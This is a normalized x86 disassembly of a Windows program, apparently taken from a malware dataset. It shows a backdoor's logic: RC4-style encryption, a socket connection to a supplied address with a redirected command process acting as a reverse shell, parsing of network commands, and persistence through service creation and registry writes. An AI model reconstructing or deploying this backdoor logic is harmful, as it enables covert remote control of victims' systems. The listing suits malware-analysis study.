lea eax [ esp + 0x10 ]
push eax
call sub_401550
mov ecx [ esp + 0x74 ]
mov edx [ esp + 0x70 ]
push ecx
lea eax [ esp + 0x18 ]
push edx
push eax
call sub_401580
lea ecx [ esp + 0x20 ]
lea edx [ esp + 0x10 ]
push ecx
push edx
call sub_401630
mov eax [ esp + 0x8c ]
lea ecx [ esp + 0x18 ]
push eax
push 0x10
push ecx
call sub_402110
add esp 0x8c
retn
sub_402220
sub esp 0x8
xor eax eax
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x24 ]
mov ecx edi
mov [ ecx ] al
inc eax
inc ecx
cmp ax 0x100
jl r-xdata
mov [ esp + 0x24 ] 0x0
xor ecx ecx
mov esi edi
mov [ esp + 0x10 ] 0x100
mov [ esp + 0x14 ] cl
mov ecx [ esp + 0x14 ]
and ecx 0xff
inc eax
mov bl [ ecx + edi ]
mov [ esi ] bl
mov [ ecx + edi ] dl
cdq
idiv [ esp + 0x20 ]
mov eax [ esp + 0x10 ]
inc esi
dec eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x24 ] dl
jne r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
mov eax [ esp + 0x24 ]
mov ebp [ esp + 0x1c ]
mov dl [ esi ]
and eax 0xff
xor ebx ebx
mov bl [ eax + ebp ]
mov ebp edx
and ebp 0xff
add ecx ebx
add ecx ebp
and ecx 0x800000ff
jns r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
sub_4022b0
sub esp 0x8
mov eax [ esp + 0x10 ]
push edi
xor edi edi
cmp eax edi
mov [ esp + 0x4 ] edi
jle r-xdata
pop edi
add esp 0x8
retn
mov ecx [ esp + 0x18 ]
push ebx
push ebp
mov ebp [ esp + 0x18 ]
push esi
xor eax eax
xor esi esi
mov [ esp + 0x24 ] al
mov eax [ esp + 0x24 ]
and eax 0xff
mov dl [ eax + ecx ]
mov ebx edx
and ebx 0xff
add ebx esi
and ebx 0x800000ff
jns r-xdata
dec eax
or eax 0xffffff00
inc eax
mov [ esp + 0x1c ] bl
mov [ esp + 0x14 ] dl
mov esi [ esp + 0x1c ]
and esi 0xff
mov bl [ esi + ecx ]
mov [ eax + ecx ] bl
mov ebx [ esp + 0x14 ]
mov [ esi + ecx ] dl
xor edx edx
mov dl [ eax + ecx ]
and ebx 0xff
add edx ebx
and edx 0x800000ff
jns r-xdata
dec ebx
or ebx 0xffffff00
inc ebx
mov bl [ edi + ebp ]
and edx 0xff
mov dl [ edx + ecx ]
xor bl dl
mov edx [ esp + 0x10 ]
inc edx
mov [ edi + ebp ] bl
movsx edi dx
mov [ esp + 0x10 ] edx
mov edx [ esp + 0x20 ]
cmp edi edx
jl r-xdata
dec edx
or edx 0xffffff00
inc edx
inc eax
and eax 0x800000ff
jns r-xdata
pop esi
pop ebp
pop ebx
sub_402380
sub esp 0x200
push ebp
push esi
push edi
xor esi esi
xor edi edi
xor eax eax
mov [ esp + eax + 0xc ] al
inc eax
cmp eax 0x100
jl r-xdata
mov ecx [ esp + 0x210 ]
xor eax eax
mov edx eax
and edx 0xf
inc eax
cmp eax 0x100
mov dl [ edx + ecx ]
mov [ esp + eax + 0x10b ] dl
jl r-xdata
xor eax eax
mov cl [ esp + eax + 0xc ]
mov dl [ esp + eax + 0x10c ]
add esi ecx
add edx esi
and edx 0xff
inc eax
mov esi edx
cmp eax 0x100
mov dl [ esp + esi + 0xc ]
mov [ esp + eax + 0xb ] dl
mov [ esp + esi + 0xc ] cl
jl r-xdata
mov ebp [ esp + 0x218 ]
xor ecx ecx
xor esi esi
test ebp ebp
jle r-xdata
pop edi
pop esi
pop ebp
add esp 0x200
retn
mov edx [ esp + 0x214 ]
push ebx
inc ecx
and ecx 0xff
mov al [ esp + ecx + 0x10 ]
mov bl al
add ebx esi
and ebx 0xff
mov esi ebx
mov bl [ esp + esi + 0x10 ]
mov [ esp + ecx + 0x10 ] bl
mov [ esp + esi + 0x10 ] al
mov bl [ esp + ecx + 0x10 ]
add bl al
and ebx 0xff
inc edi
cmp edi ebp
mov al [ esp + ebx + 0x10 ]
mov [ edi + edx - 0x1 ] al
jl r-xdata
pop ebx
sub_402450
push ecx
push ebx
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x10 ]
call sub_401000
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x14 ]
push eax
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
mov ebx [ esp + 0x1c ]
not ecx
dec ecx
push ebx
push ecx
push esi
lea ecx [ esp + 0x1c ]
call sub_401260
mov ecx [ esp + 0x14 ]
pop edi
pop esi
mov [ ecx + ebx ] 0x0
mov eax [ esp + 0xc ]
pop ebx
pop ecx
retn
sub_4024b0
sub esp 0x218
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
push ebx
push ebp
push esi
mov [ esp + 0x10 ] eax
mov al [ rw-data ]
push edi
push 0x100
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] edx
mov [ esp + 0x24 ] al
call Ordinal_MFC42_823
mov esi [ esp + 0x230 ]
mov ebp eax
mov edi esi
or ecx 0xffffffff
xor eax eax
add esp 0x4
xor edx edx
mov [ esp + 0x10 ] ebp
[ edi ]
not ecx
dec ecx
je r-xdata
mov [ esp + edx + 0x24 ] 0x0
push ebp
lea edx [ esp + 0x18 ]
push 0xd
push edx
call sub_402220
mov edi esi
or ecx 0xffffffff
xor eax eax
push ebp
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0x34 ]
push ecx
push eax
call sub_4022b0
mov edi esi
or ecx 0xffffffff
xor eax eax
add esp 0x18
xor ebx ebx
[ edi ]
not ecx
dec ecx
je r-xdata
mov ebx esi
lea ecx [ esp + 0x24 ]
sub ebx ecx
mov edx [ esp + 0x230 ]
test ebp ebp
mov [ ebx + edx ] 0x0
je r-xdata
mov edx [ esp + 0x230 ]
lea ebp [ esp + 0x24 ]
sub ebp edx
lea eax [ ebx + edx ]
mov edi esi
inc edx
mov cl [ esp + eax + 0x24 ]
xor eax eax
mov [ esp + edx + 0x23 ] cl
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
cmp edx ecx
jb r-xdata
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
add esp 0x218
retn
push ebp
call Ordinal_MFC42_825
add esp 0x4
mov cl [ edx + ebp ]
inc ebx
mov [ edx ] cl
mov edi esi
or ecx 0xffffffff
xor eax eax
inc edx
[ edi ]
not ecx
dec ecx
cmp ebx ecx
jb r-xdata
mov ebp [ esp + 0x10 ]
sub_4025c0
sub esp 0x40c
push esi
push edi
xor edi edi
push rw-data
mov [ esp + 0x10 ] edi
mov [ esp + 0xc ] edi
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
add esp 0x40c
retn
mov edi [ GetProcAddress@IAT ]
push ebx
push ebp
push rw-data
push esi
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push 0x0
push 0x0
push 0x0
push 0x0
push rw-data
mov [ rw-data ] eax
call [ rw-data ]
mov ebp eax
test ebp ebp
je r-xdata
push esi
call [ FreeLibrary@IAT ]
mov eax [ esp + 0x14 ]
pop ebp
pop ebx
pop edi
pop esi
add esp 0x40c
retn
mov eax [ esp + 0x420 ]
push 0x0
push 0x80000000
push 0x0
push 0x0
push eax
push ebp
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
push ebp
call [ rw-data ]
test ebx ebx
je r-xdata
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x18 ]
lea edx [ esp + 0x18 ]
[ edi ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10 ] 0x0
push ecx
push 0x400
push edx
push ebx
stosb [ edi ]
call [ rw-data ]
test eax eax
je r-xdata
push ebx
call [ rw-data ]
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
push ecx
mov [ esp + eax + 0x1c ] 0x0
mov eax [ esp + 0x428 ]
push eax
mov [ eax ] 0x0
call sub_402700
add esp 0x8
test eax eax
je r-xdata
mov [ esp + 0x14 ] 0x1
sub_402700
sub esp 0xc
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
xor ebx ebx
xor esi esi
test eax eax
push edi
mov [ esp + 0x10 ] 0x0
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov ebp [ strchr@IAT ]
push 0x3c
push eax
call ebp
add esp 0x8
test eax eax
je r-xdata
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
push ecx
call Ordinal_MFC42_823
mov esi eax
push esi
push ebx
mov [ esi ] 0x0
call sub_402450
mov [ eax + esi ] 0x0
mov al [ esi ]
add esp 0xc
cmp al 0x73
je r-xdata
test esi esi
jne r-xdata
add esi 0x2
push esi
call [ atoi@IAT ]
mov ecx [ esp + 0x24 ]
add esp 0x4
mov [ ecx + 0x4 ] eax
neg eax
sbb eax eax
add eax 0x2
mov [ ecx ] eax
cmp al 0x53
je r-xdata
cmp [ eax + 0x1 ] 0x21
jne r-xdata
cmp al 0x64
je r-xdata
cmp [ eax + 0x2 ] 0x2d
jne r-xdata
push 0x20
push esi
call ebp
mov edx [ esp + 0x28 ]
add esp 0x8
test eax eax
jne r-xdata
cmp al 0x44
je r-xdata
cmp [ eax + 0x3 ] 0x2d
jne r-xdata
mov ecx eax
lea edi [ edx + 0x29 ]
sub ecx esi
add esi 0x2
sub ecx 0x2
mov [ edx ] 0x3
mov ebx ecx
add edx 0x42a
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
mov [ esp + 0x10 ] 0x1
and ecx 0x3
[ edi ] [ esi ]
lea edi [ eax + 0x1 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax [ esp + 0x10 ]
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
pop edi
mov [ esp + 0xc ] 0x1
mov eax [ esp + 0xc ]
pop esi
pop ebp
mov [ edx ] 0x4
pop ebx
add esp 0xc
retn
push 0x3a
push esi
call ebp
add esp 0x8
test eax eax
je r-xdata
cmp [ eax + 0x4 ] 0x20
jne r-xdata
mov ecx [ esp + 0x20 ]
pop edi
mov [ esp + 0xc ] 0x1
pop esi
mov eax [ esp + 0x8 ]
pop ebp
mov [ ecx ] 0x0
pop ebx
add esp 0xc
retn
push 0x3a
push esi
call ebp
mov ebp [ esp + 0x28 ]
mov edi eax
sub eax esi
add esp 0x8
cmp eax 0x20
mov [ ebp ] 0x5
jle r-xdata
lea ebx [ eax + 0x5 ]
push 0x20
push ebx
call ebp
add esp 0x8
test eax eax
je r-xdata
push eax
lea eax [ ebp + 0x8 ]
push esi
mov esi [ strncpy@IAT ]
push eax
call esi
mov cl [ edi + 0x1 ]
add esp 0xc
inc edi
test cl cl
mov eax edi
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
mov [ ebp ] 0x0
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov dl [ eax + 0x1 ]
lea ecx [ eax + 0x1 ]
cmp dl 0x2d
jne r-xdata
xor ecx ecx
sub edi eax
mov [ esp + 0x14 ] ecx
cmp edi 0x5
mov [ esp + 0x18 ] cx
jle r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
push 0x20
push ecx
call ebp
add esp 0x8
test eax eax
je r-xdata
cmp [ eax + 0x2 ] 0x2d
jne r-xdata
push edi
lea edx [ esp + 0x18 ]
push eax
push edx
call esi
lea eax [ esp + 0x20 ]
push eax
call [ atoi@IAT ]
add esp 0x10
mov [ ebp + 0x530 ] eax
test eax eax
jle r-xdata
mov eax [ esp + 0x10 ]
pop edi
mov [ ebp ] ecx
pop esi
pop ebp
pop ebx
add esp 0xc
retn
jmp r-xdata
cmp [ eax + 0x3 ] 0x3e
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
mov [ ebp ] 0x0
pop esi
pop ebp
pop ebx
add esp 0xc
retn
cmp eax 0xffff
jle r-xdata
test eax eax
mov [ eax + 0x1 ] 0x0
mov esi 0x1
jne r-xdata
mov [ esp + 0x10 ] 0x1
sub_402980
sub esp 0x1bc
push ebx
push ebp
push esi
lea eax [ esp + 0x38 ]
push edi
xor ebp ebp
push eax
push 0x202
xor edi edi
mov [ esp + 0x18 ] ebp
call [ WSAStartup@IAT ]
test eax eax
jne r-xdata
call [ WSACleanup@IAT ]
test edi edi
je r-xdata
push ebp
push ebp
push ebp
push ebp
push 0x1
push 0x2
call [ WSASocketA@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1bc
retn
push edi
call [ closesocket@IAT ]
lea ecx [ esp + 0x10 ]
push 0x4
push ecx
push 0x1001
push 0xffff
push edi
call [ setsockopt@IAT ]
cmp eax 0xffffffff
je r-xdata
mov edx [ esp + 0x1d4 ]
mov [ esp + 0x14 ] 0x2
push edx
call [ htons@IAT ]
mov [ esp + 0x16 ] ax
mov eax [ esp + 0x1d0 ]
push eax
call [ inet_addr@IAT ]
mov ebx [ connect@IAT ]
mov [ esp + 0x18 ] eax
cmp ebp 0xa
je r-xdata
push 0x7d0
inc ebp
call [ Sleep@IAT ]
test esi esi
jne r-xdata
lea ecx [ esp + 0x14 ]
push 0x10
push ecx
push edi
call ebx
mov esi eax
cmp esi 0xffffffff
jne r-xdata
lea edx [ esp + 0x24 ]
mov [ esp + 0x24 ] esi
push edx
mov [ esp + 0x28 ] edi
call sub_402a70
add esp 0x4
sub_402a70
sub esp 0x8a4
push ebx
push ebp
push esi
push edi
xor ebx ebx
mov ecx 0x10
xor eax eax
lea edi [ esp + 0x50 ]
mov [ esp + 0x4c ] ebx
mov esi [ esp + 0x8b8 ]
[ edi ]
mov ecx 0x100
lea edi [ esp + 0x4b0 ]
[ edi ]
lea ecx [ esp + 0x1c ]
push ebx
stosb [ edi ]
mov edi [ CreatePipe@IAT ]
lea edx [ esp + 0x14 ]
lea eax [ esi + 0x4 ]
push ecx
push edx
push eax
mov [ esp + 0x2c ] 0xc
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] 0x1
call edi
test eax eax
jne r-xdata
lea ecx [ esp + 0x1c ]
push ebx
lea edx [ esi + 0x8 ]
push ecx
lea eax [ esp + 0x1c ]
push edx
push eax
call edi
test eax eax
jne r-xdata
lea eax [ esp + 0x4b0 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0x8
jmp r-xdata
lea edx [ esp + 0x4c ]
mov [ esp + 0x4c ] 0x44
push edx
call [ GetStartupInfoA@IAT ]
mov eax [ esp + 0x14 ]
mov edi [ GetCurrentProcess@IAT ]
push ebx
mov [ esp + 0x88 ] eax
mov eax [ esp + 0x14 ]
push 0x1
lea ecx [ esp + 0x94 ]
push 0x2
push ecx
mov [ esp + 0x88 ] 0x101
mov [ esp + 0x8c ] bx
mov [ esp + 0x98 ] eax
mov [ esp + 0x9c ] eax
call edi
mov edx [ esp + 0x20 ]
push eax
push edx
call edi
push eax
call [ DuplicateHandle@IAT ]
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x198 ]
push 0x104
[ edi ]
stosb [ edi ]
lea eax [ esp + 0x19c ]
push eax
call [ GetSystemDirectoryA@IAT ]
mov [ esp + eax + 0x198 ] bl
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x3a8 ]
mov ebp [ sprintf@IAT ]
push rw-data
[ edi ]
lea ecx [ esp + 0x19c ]
lea edx [ esp + 0x3ac ]
push ecx
push rw-data
push edx
stosb [ edi ]
call ebp
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x2b0 ]
add esp 0x10
[ edi ]
stosb [ edi ]
lea eax [ esp + 0x2a0 ]
push eax
push 0x104
call [ GetTempPathA@IAT ]
mov [ esp + eax + 0x2a0 ] bl
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x90 ]
[ edi ]
lea ecx [ esp + 0x2a0 ]
push rw-data
push ecx
lea edx [ esp + 0x98 ]
push rw-data
push edx
stosb [ edi ]
call ebp
add esp 0x10
lea eax [ esp + 0x90 ]
lea ecx [ esp + 0x3a8 ]
push ebx
push eax
push ecx
call [ CopyFileA@IAT ]
lea edx [ esp + 0x3c ]
mov [ esp + 0x3c ] ebx
push edx
lea eax [ esp + 0x50 ]
push eax
push ebx
push ebx
push ebx
push 0x1
push ebx
push ebx
lea ecx [ esp + 0xb0 ]
push ebx
push ecx
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x4b0 ]
push rw-data
push ecx
call [ sprintf@IAT ]
add esp 0x8
jmp r-xdata
lea edi [ esp + 0x4b0 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
je r-xdata
mov eax [ esp + 0x3c ]
mov edi [ CreateThread@IAT ]
lea ecx [ esp + 0x18 ]
lea edx [ esp + 0x28 ]
push ecx
push ebx
push esi
push sub_402e30
push ebx
push edx
mov [ esi + 0xc ] eax
mov [ esp + 0x40 ] 0xc
mov [ esp + 0x44 ] ebx
mov [ esp + 0x48 ] ebx
call edi
cmp eax ebx
mov [ esi + 0x10 ] eax
jne r-xdata
lea edx [ esp + 0x4b0 ]
push rw-data
push edx
call ebp
add esp 0x8
jmp r-xdata
mov eax [ esi + 0x4 ]
mov ebp [ DisconnectNamedPipe@IAT ]
mov edi [ CloseHandle@IAT ]
cmp eax ebx
je r-xdata
lea edi [ esp + 0x4b0 ]
or ecx 0xffffffff
[ edi ]
mov eax [ esi ]
lea edx [ esp + 0x4b0 ]
not ecx
dec ecx
push ecx
push edx
push eax
call sub_403050
add esp 0xc
lea ecx [ esp + 0x18 ]
lea edx [ esp + 0x28 ]
push ecx
push ebx
push esi
push sub_402f40
push ebx
push edx
call edi
cmp eax ebx
mov [ esi + 0x14 ] eax
jne r-xdata
lea eax [ esp + 0x4b0 ]
push rw-data
push eax
call ebp
add esp 0x8
jmp r-xdata
mov eax [ esi + 0x8 ]
cmp eax ebx
je r-xdata
push eax
call ebp
mov ecx [ esi + 0x4 ]
push ecx
call edi
mov ecx [ esi + 0x10 ]
push 0xffffffff
lea edx [ esp + 0x38 ]
push ebx
push edx
push 0x2
mov [ esp + 0x44 ] ecx
mov [ esp + 0x48 ] eax
call [ WaitForMultipleObjects@IAT ]
sub eax ebx
je r-xdata
lea eax [ esp + 0x4b0 ]
push rw-data
push eax
call ebp
add esp 0x8
jmp r-xdata
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
push eax
call ebp
mov edx [ esi + 0x8 ]
push edx
call edi
mov ecx [ esi + 0x10 ]
mov edi [ TerminateThread@IAT ]
push ebx
push ecx
call edi
mov edx [ esi + 0x14 ]
push ebx
push edx
call edi
mov eax [ esi + 0xc ]
push 0x1
push eax
call [ TerminateProcess@IAT ]
push 0x7d0
call [ Sleep@IAT ]
lea ecx [ esp + 0x90 ]
push ecx
dec eax
jne r-xdata
mov eax [ esp + 0x10 ]
cmp eax ebx
je r-xdata
push eax
call edi
mov eax [ esi + 0x14 ]
mov edi [ TerminateThread@IAT ]
push ebx
push eax
call edi
mov ecx [ esi + 0x10 ]
push ebx
push ecx
call edi
mov edx [ esi + 0xc ]
push 0x1
push edx
call [ TerminateProcess@IAT ]
push 0x7d0
call [ Sleep@IAT ]
lea eax [ esp + 0x90 ]
push eax
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8a4
retn
push eax
call edi
call [ DeleteFileA@IAT ]
sub_402e30
sub esp 0x408
push ebp
push esi
push edi
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x10 ]
[ edi ]
mov esi [ esp + 0x418 ]
mov ebp [ PeekNamedPipe@IAT ]
stosb [ edi ]
mov edx [ esi + 0x4 ]
push 0x0
lea eax [ esp + 0x10 ]
push 0x0
push eax
lea ecx [ esp + 0x1c ]
push 0x400
push ecx
push edx
mov [ esp + 0x24 ] 0x0
call ebp
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebp
add esp 0x408
retn 0x4
mov eax [ esp + 0xc ]
test eax eax
jne r-xdata
mov edx [ esi + 0x4 ]
lea eax [ esp + 0xc ]
push 0x0
push eax
lea ecx [ esp + 0x18 ]
push 0x400
push ecx
push edx
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov edi [ Sleep@IAT ]
push 0x32
call edi
mov edx [ esi + 0x4 ]
push 0x0
lea eax [ esp + 0x10 ]
push 0x0
push eax
lea ecx [ esp + 0x1c ]
push 0x400
push ecx
push edx
call ebp
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esi ]
push eax
mov [ esp + eax + 0x14 ] 0x0
lea eax [ esp + 0x14 ]
push eax
push ecx
call sub_403050
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x10 ]
[ edi ]
stosb [ edi ]
jmp r-xdata
push 0x32
call edi
mov ecx [ esi + 0x4 ]
push 0x0
lea edx [ esp + 0x10 ]
push 0x0
push edx
lea eax [ esp + 0x1c ]
push 0x400
push eax
push ecx
call ebp
test eax eax
jne r-xdata
sub_402f40
sub esp 0x514
push ebp
mov ebp [ esp + 0x51c ]
push esi
push edi
mov [ esp + 0xc ] 0x0
mov [ esp + 0x10 ] 0x0
mov [ esp + 0x14 ] 0x0
pop edi
pop esi
mov eax 0x1
pop ebp
add esp 0x514
retn 0x4
test eax eax
je r-xdata
mov eax [ ebp ]
lea ecx [ esp + 0x10 ]
push ecx
push 0x0
lea edx [ esp + 0x20 ]
push 0x0
push edx
push 0x0
mov [ esp + 0x30 ] eax
mov [ esp + 0x2c ] 0x1
call [ select@IAT ]
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp ]
lea eax [ esp + 0x18 ]
push eax
push ecx
call __WSAFDIsSet
test eax eax
je r-xdata
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x11c ]
lea edx [ esp + 0x11c ]
[ edi ]
stosb [ edi ]
mov eax [ ebp ]
push 0x400
push edx
push eax
call sub_4030f0
mov edi eax
add esp 0xc
cmp edi 0xffffffff
je r-xdata
mov esi rw-data
lea ecx [ esp + 0x11c ]
sbb ecx ecx
sbb ecx 0xffffffff
test dl dl
je r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ esp + 0xc ]
push 0x0
push ecx
lea edx [ esp + 0x124 ]
push edi
push edx
push eax
call [ WriteFile@IAT ]
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov al [ ecx + 0x1 ]
mov dl al
cmp al [ esi + 0x1 ]
jne r-xdata
test ecx ecx
je r-xdata
add ecx 0x2
add esi 0x2
test dl dl
jne r-xdata
mov al [ ecx ]
mov dl al
cmp al [ esi ]
jne r-xdata
sub_403050
push ecx
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x20 ]
lea ecx [ esp + 0x20 ]
push edi
mov [ esp + 0x14 ] 0x0
call sub_4014c0
mov [ esp + 0x10 ] eax
inc eax
push eax
call Ordinal_MFC42_823
mov ecx [ esp + 0x20 ]
add esp 0x4
mov esi eax
lea eax [ esp + 0x10 ]
push eax
push esi
push edi
push ecx
push rw-data
lea ecx [ esp + 0x34 ]
mov [ esi ] 0x0
call sub_401450
mov edx [ esp + 0x10 ]
mov ebx [ esp + 0x18 ]
mov ebp [ send@IAT ]
push 0x0
mov [ esi + edx ] 0x0
mov eax [ esp + 0x14 ]
push eax
push esi
push ebx
call ebp
mov edi eax
cmp edi 0xffffffff
je r-xdata
test esi esi
je r-xdata
push 0x0
push 0x1
push rw-data
push ebx
call ebp
mov edi eax
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_4030f0
sub esp 0x8
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
push eax
lea ecx [ esp + 0x18 ]
mov [ esp + 0x14 ] 0xffffffff
xor ebx ebx
call sub_4014c0
inc eax
push eax
call Ordinal_MFC42_823
mov ebp eax
add esp 0x4
mov [ ebp ] ebx
test ebp ebp
je r-xdata
mov [ esp + eax + 0x24 ] 0x0
lea eax [ esp + 0x24 ]
push rw-data
push eax
call [ _strcmpi@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
push ebp
call Ordinal_MFC42_825
add esp 0x4
test ebx ebx
mov [ ebx + ebp ] 0x0
je r-xdata
lea edi [ esp + 0x24 ]
or ecx 0xffffffff
xor eax eax
inc ebx
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov esi [ esp + 0x20 ]
lea eax [ esp + 0x10 ]
push eax
push esi
push ebx
push ebp
push rw-data
lea ecx [ esp + 0x28 ]
call sub_4013f0
mov ecx [ esp + 0x10 ]
mov [ ecx + esi ] 0x0
mov edx [ esp + 0x1c ]
push 0x0
lea ecx [ esp + 0x28 ]
push 0x1
push ecx
push edx
mov [ esp + 0x34 ] 0x0
call [ recv@IAT ]
test eax eax
je r-xdata
sub_4031d0
push ebx
push esi
push edi
xor ebx ebx
push 0xf003f
push ebx
push ebx
call [ OpenSCManagerA@IAT ]
mov edi eax
test edi edi
je r-xdata
pop edi
mov eax ebx
pop esi
pop ebx
retn
push 0xf01ff
push rw-data
push edi
call [ OpenServiceA@IAT ]
mov esi eax
test esi esi
je r-xdata
push edi
mov edi [ CloseServiceHandle@IAT ]
call edi
test esi esi
je r-xdata
mov ebx 0x1
push esi
call edi
sub_403220
sub esp 0x198
push ebx
push ebp
push esi
push edi
mov ecx 0x21
mov esi rw-data
lea edi [ esp + 0x18 ]
xor eax eax
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ecx 0x41
lea edi [ esp + 0xa0 ]
[ edi ]
stosb [ edi ]
lea eax [ esp + 0xa0 ]
xor ebx ebx
push 0x104
push eax
push ebx
mov [ esp + 0x20 ] ebx
xor ebp ebp
mov [ esp + 0x1c ] ebx
call [ GetModuleFileNameA@IAT ]
test eax eax
je r-xdata
mov edi [ esp + 0x14 ]
push 0xf003f
push ebp
push ebp
mov [ esp + eax + 0xac ] 0x0
call [ OpenSCManagerA@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ CloseServiceHandle@IAT ]
test ebx ebx
je r-xdata
push eax
call [ RegCloseKey@IAT ]
mov [ esp + 0x10 ] 0x0
push ebp
push ebp
push ebp
push ebp
lea ecx [ esp + 0xb0 ]
push ebp
push ecx
push ebp
push 0x2
push 0x10
push 0xf01ff
push rw-data
push rw-data
push ebx
call [ CreateServiceA@IAT ]
mov ebp eax
test ebp ebp
je r-xdata
test ebp ebp
je r-xdata
push ebx
call esi
push 0x10
push rw-data
push ebx
call [ OpenServiceA@IAT ]
mov ebp eax
test ebp ebp
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x198
retn
push ebp
call esi
lea edx [ esp + 0x10 ]
push edx
push 0x20006
push 0x0
push rw-data
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
[ edi ]
not ecx
lea eax [ esp + 0x18 ]
push ecx
mov ecx [ esp + 0x14 ]
push eax
push 0x1
push 0x0
push rw-data
push ecx
call [ RegSetValueExA@IAT ]
test eax eax
jne r-xdata
mov ecx 0x21
lea edi [ esp + 0x18 ]
[ edi ]
stosw [ edi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
mov edx [ esp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
[ edi ]
not ecx
push ecx
lea ecx [ esp + 0x1c ]
push ecx
push 0x1
push eax
push rw-data
push edx
call [ RegSetValueExA@IAT ]
test eax eax
jne r-xdata
push eax
push eax
push ebp
call [ StartServiceA@IAT ]
mov edi 0x1
jmp r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
sub_4033e0
push esi
xor esi esi
push sub_403470
push rw-data
mov [ rw-data ] 0x30
mov [ rw-data ] 0x2
mov [ rw-data ] 0x3
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
call [ RegisterServiceCtrlHandlerA@IAT ]
cmp eax esi
mov [ rw-data ] eax
je r-xdata
pop esi
retn 0x8
push rw-data
push eax
mov [ rw-data ] 0x4
mov [ rw-data ] esi
mov [ rw-data ] esi
call [ SetServiceStatus@IAT ]
test eax eax
je r-xdata
call sub_4034f0
sub_403470
mov eax [ esp + 0x4 ]
dec eax
je r-xdata
mov ecx [ rw-data ]
xor eax eax
push rw-data
push ecx
mov [ rw-data ] 0x1
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
call [ SetServiceStatus@IAT ]
retn 0x4
dec eax
je r-xdata
mov [ rw-data ] 0x7
dec eax
jne r-xdata
mov eax [ rw-data ]
